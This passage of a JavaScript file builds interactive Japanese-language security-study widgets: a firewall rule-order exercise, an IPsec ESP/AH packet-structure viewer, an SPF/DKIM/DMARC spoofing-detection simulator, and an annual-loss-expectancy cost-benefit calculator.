        t.appendChild(h('tr', { class: 'dim-row' }, [h('td', { text: '—' }), h('td', { text: '拒否' }), h('td', { text: 'any' }), h('td', { text: 'any' }), h('td', { text: 'any' }), h('td', { text: '(暗黙)' })]));
        clear(tableBox).appendChild(t);
        var ok = 0;
        var pt = h('table', { class: 'v-table' }, h('tr', null, ['パケット', '用途', '結果', '期待', ''].map(function (x) { return h('th', { text: x }); })));
        packets.forEach(function (p) {
          var j = judge(p), good = j.act === p.want;
          if (good) ok++;
          pt.appendChild(h('tr', { class: good ? '' : 'crit' }, [
            h('td', { text: p.src + ' → ' + p.dst + ':' + p.port }), h('td', { text: p.note }),
            h('td', { text: (j.act === 'allow' ? '許可' : '拒否') + '(' + j.by + ')' }),
            h('td', { text: p.want === 'allow' ? '許可' : '拒否' }), h('td', { text: good ? '○' : '✕' })
          ]));
        });
        clear(pktBox).appendChild(pt);
        verdict.className = 'v-verdict ' + (ok === packets.length ? 'ok' : 'warn');
        verdict.textContent = ok === packets.length ? '完成!「外部→内部の拒否」を、広い「443番の許可」より上に置くのがポイント。'
          : packets.length + '個中 ' + ok + '個が期待どおり。✕ の行は、どのルールに最初に一致しているかを見てみよう。';
      }
      root.appendChild(h('div', { class: 'v-label', text: 'ルール表' })); root.appendChild(tableBox);
      root.appendChild(h('div', { class: 'v-label', text: 'パケットの判定' })); root.appendChild(pktBox);
      root.appendChild(verdict);
      draw();
    }
  });

  /* ------------------------------------------------------------------
   * IPsec のモード
   * ------------------------------------------------------------------ */
  V.register('ipsec', {
    title: 'IPsec のパケット構造(ESP / AH、トンネル / トランスポート)',
    desc: 'モードを切り替えると、どこが暗号化され(鍵マーク)、どこが改ざん検知の対象になるか(下線)が変わります。',
    mount: function (root) {
      var mode = 'tunnel';
      var seg = ui.segmented([{ value: 'orig', label: '元のパケット' }, { value: 'transport', label: 'ESP トランスポート' }, { value: 'tunnel', label: 'ESP トンネル' }, { value: 'ah', label: 'AH トランスポート' }], mode, function (v) { mode = v; draw(); });
      var pkt = h('div', { class: 'v-packet' });
      var note = h('div', { class: 'v-verdict' });
      var LAYOUT = {
        orig: [['IPヘッダ', 'ip'], ['TCP', 'tcp'], ['データ', 'data']],
        transport: [['IPヘッダ', 'ip'], ['ESPヘッダ', 'esp a'], ['TCP', 'tcp e a'], ['データ', 'data e a'], ['ESPトレーラ', 'esp e a'], ['ESP認証', 'esp']],
        tunnel: [['新IPヘッダ', 'ip new'], ['ESPヘッダ', 'esp a'], ['元IPヘッダ', 'ip e a'], ['TCP', 'tcp e a'], ['データ', 'data e a'], ['ESPトレーラ', 'esp e a'], ['ESP認証', 'esp']],
        ah: [['IPヘッダ', 'ip a'], ['AHヘッダ', 'esp a'], ['TCP', 'tcp a'], ['データ', 'data a']]
      };
      var NOTES = {
        orig: '保護なしの IP パケット。経路上で中身を見られ、書き換えられる。',
        transport: '元の IP ヘッダはそのまま。TCP とデータが暗号化される。端末どうしの通信向け。送信元・宛先の IP アドレスは見える。',
        tunnel: '元の IP パケットを丸ごと暗号化し、VPN 装置間の新しい IP ヘッダを付ける。拠点間 VPN 向け。社内の IP アドレスも隠せる。',
        ah: 'AH は認証(改ざん検知)だけで暗号化しない。IP ヘッダの一部まで保護するので、アドレスを書き換える NAT と相性が悪い。'
      };
      function draw() {
        clear(pkt);
        LAYOUT[mode].forEach(function (f) {
          pkt.appendChild(h('div', { class: 'v-field ' + f[1] }, [f[1].indexOf(' e') >= 0 ? h('span', { class: 'lock', text: '🔒' }) : null, f[0]]));
        });
        note.className = 'v-verdict';
        note.textContent = NOTES[mode];
      }
      root.appendChild(seg.el); root.appendChild(pkt);
      root.appendChild(h('div', { class: 'v-legend' }, [h('span', null, '🔒 = 暗号化される範囲'), h('span', null, [h('i', { class: 'v-auth-mark' }), '下線 = 改ざん検知の対象'])]));
      root.appendChild(note);
      draw();
    }
  });

  /* ------------------------------------------------------------------
   * SPF / DKIM / DMARC
   * ------------------------------------------------------------------ */
  V.register('mailauth', {
    title: 'SPF・DKIM・DMARC の判定シミュレータ',
    desc: '自社(c-sha.example)を名乗るメールの種類と、自社の設定を変えて、受信側の判定がどうなるかを確かめましょう。',
    mount: function (root) {
      var SC = {
        legit: { name: '正規のメール', ip: '203.0.113.10(自社サーバ)', env: 'c-sha.example', header: 'c-sha.example', spfOk: true, signer: 'own' },
        spoof1: { name: 'なりすまし(攻撃者のドメインで送信)', ip: '198.51.100.77', env: 'mailer.example.net', header: 'c-sha.example', spfOk: true, signer: 'attacker' },
        spoof2: { name: 'なりすまし(エンベロープも詐称)', ip: '198.51.100.77', env: 'c-sha.example', header: 'c-sha.example', spfOk: false, signer: 'none' },
        forward: { name: '正規メールの転送', ip: '192.0.2.200(転送サーバ)', env: 'c-sha.example', header: 'c-sha.example', spfOk: false, signer: 'own' }
      };
      var cur = 'spoof1', dkimOn = true, policy = 'reject';
      var seg = ui.segmented(Object.keys(SC).map(function (k) { return { value: k, label: SC[k].name }; }), cur, function (v) { cur = v; draw(); });
      var dk = h('button', { type: 'button', class: 'v-key', onclick: function () { dkimOn = !dkimOn; draw(); } });
      var pol = ui.segmented([{ value: 'none', label: 'p=none' }, { value: 'quarantine', label: 'p=quarantine' }, { value: 'reject', label: 'p=reject' }], policy, function (v) { policy = v; draw(); });
      var hdr = h('pre', { class: 'v-code' });
      var tbl = h('div', { class: 'v-scroll' });
      var verdict = h('div', { class: 'v-verdict' });
      function draw() {
        dk.className = 'v-key' + (dkimOn ? ' is-on' : '');
        dk.textContent = (dkimOn ? '✓ ' : '') + '自社メールに DKIM 署名を付ける';
        var m = SC[cur];
        var dkimDomain = m.signer === 'own' ? (dkimOn ? 'c-sha.example' : null) : m.signer === 'attacker' ? 'mailer.example.net' : null;
        hdr.textContent = '接続元 IP : ' + m.ip + '\nMAIL FROM  : bounce@' + m.env + '   ← エンベロープ From\nFrom:       経理部 <keiri@' + m.header + '>   ← ヘッダ From(利用者が見る)\nDKIM-Signature: ' + (dkimDomain ? 'd=' + dkimDomain + ' ...' : '(なし)');
        var spf = m.spfOk ? 'pass' : 'fail';
        var dkim = dkimDomain ? 'pass' : 'none';
        var spfAlign = spf === 'pass' && m.env === m.header;
        var dkimAlign = dkim === 'pass' && dkimDomain === m.header;
        var dmarc = spfAlign || dkimAlign ? 'pass' : 'fail';
        var t = h('table', { class: 'v-table' }, h('tr', null, ['検査', '結果', '検証したドメイン', 'ヘッダ From と一致'].map(function (x) { return h('th', { text: x }); })));
        [['SPF', spf, m.env, spf === 'pass' ? (spfAlign ? '○' : '✕') : '—'], ['DKIM', dkim, dkimDomain || '—', dkim === 'pass' ? (dkimAlign ? '○' : '✕') : '—'], ['DMARC', dmarc, m.header, dmarc === 'pass' ? 'SPF か DKIM が一致' : 'どちらも一致せず']].forEach(function (r) {
          t.appendChild(h('tr', { class: r[1] === 'fail' ? 'crit' : '' }, r.map(function (x) { return h('td', { text: x }); })));
        });
        clear(tbl).appendChild(t);
        var legit = cur === 'legit' || cur === 'forward';
        var action = dmarc === 'pass' ? '受信箱に配送' : policy === 'none' ? '受信箱に配送(監視のみ)' : policy === 'quarantine' ? '迷惑メールフォルダへ隔離' : '受信を拒否';
        var good = legit ? dmarc === 'pass' || policy === 'none' : dmarc === 'fail' && policy !== 'none';
        verdict.className = 'v-verdict ' + (good ? 'ok' : 'ng');
        verdict.textContent = '受信側の扱い: ' + action + ' — ' + (legit
          ? (dmarc === 'pass' ? '正規のメールが正しく届く。' + (cur === 'forward' ? '転送で SPF は失敗したが、DKIM 署名が残っているので DMARC に合格。' : '')
            : '正規のメールなのに' + (policy === 'none' ? '認証は失敗している(今は監視のみなので届く)。' : '届かない!') + (cur === 'forward' ? '転送で SPF が失敗し、DKIM 署名もない。DKIM を付ければ救える。' : ''))
          : (dmarc === 'fail' ? (policy === 'none' ? 'なりすましを見抜いたのに、p=none なので届いてしまう。' : 'なりすましを止められた。') : 'なりすましが通ってしまった。'));
      }
      root.appendChild(seg.el);
      root.appendChild(h('div', { class: 'v-row' }, [dk]));
      root.appendChild(h('div', { class: 'v-label', text: '自社の DMARC ポリシ' })); root.appendChild(pol.el);
      root.appendChild(hdr); root.appendChild(tbl); root.appendChild(verdict);
      draw();
    }
  });

  /* ------------------------------------------------------------------
   * リスク評価(ALE と費用対効果)
   * ------------------------------------------------------------------ */
  V.register('riskmatrix', {
    title: '年間予想損失額と対策の費用対効果',
    desc: '1回の損失額と発生頻度からリスクを見積もり、対策費用に見合うかを判断します。',
    mount: function (root) {
      var sle = ui.slider({ label: '1回の損失額 SLE', min: 50, max: 5000, step: 50, value: 500, fmt: function (v) { return v + ' 万円'; }, onInput: draw });
      var aro = ui.slider({ label: '年間発生率 ARO', min: 0.05, max: 3, step: 0.05, value: 0.2, fmt: function (v) { return v.toFixed(2) + ' 回/年'; }, onInput: draw });
      var red = ui.slider({ label: '対策による発生率の低減', min: 0, max: 100, step: 5, value: 80, fmt: function (v) { return v + '%'; }, onInput: draw });
      var cost = ui.slider({ label: '対策の年間費用', min: 0, max: 1000, step: 10, value: 50, fmt: function (v) { return v + ' 万円/年'; }, onInput: draw });
      var grid = h('div', { class: 'v-riskgrid' });
      var metrics = h('div', { class: 'v-metrics' });
      var verdict = h('div', { class: 'v-verdict' });
      function draw() {
        var ale = sle.value * aro.value, after = ale * (1 - red.value / 100), benefit = ale - after;
        var li = aro.value < 0.3 ? 0 : aro.value < 1 ? 1 : 2, im = sle.value < 300 ? 0 : sle.value < 1500 ? 1 : 2;
        clear(grid);
        grid.appendChild(h('div', { class: 'v-rg-y', text: '発生頻度 →' }));
        for (var y = 2; y >= 0; y--) {
          for (var x = 0; x < 3; x++) {
            var lv = x + y;
            grid.appendChild(h('div', { class: 'v-rg-cell lv' + lv + (x === im && y === li ? ' cur' : ''), text: x === im && y === li ? '●' : '' }));
          }
        }
        grid.appendChild(h('div', { class: 'v-rg-x', text: '影響度 →' }));
        clear(metrics);
        metrics.appendChild(metric('対策前 ALE', fmt(ale, 0) + ' 万円/年', 'neg'));
        metrics.appendChild(metric('対策後 ALE', fmt(after, 0) + ' 万円/年'));
        metrics.appendChild(metric('損失の削減額', fmt(benefit, 0) + ' 万円/年', 'good'));
        metrics.appendChild(metric('対策費用', cost.value + ' 万円/年'));
        var ok = benefit > cost.value;
        verdict.className = 'v-verdict ' + (ok ? 'ok' : 'warn');
        verdict.textContent = ok ? '削減額が費用を上回るので、費用対効果のある対策(リスク低減)。'
          : '費用が削減額を上回る。保険によるリスク移転や、リスク保有(受容)も検討する。';
      }
      root.appendChild(sle.el); root.appendChild(aro.el); root.appendChild(red.el); root.appendChild(cost.el);
      root.appendChild(grid); root.appendChild(metrics); root.appendChild(verdict);
      draw();
    }
  });
})(window);
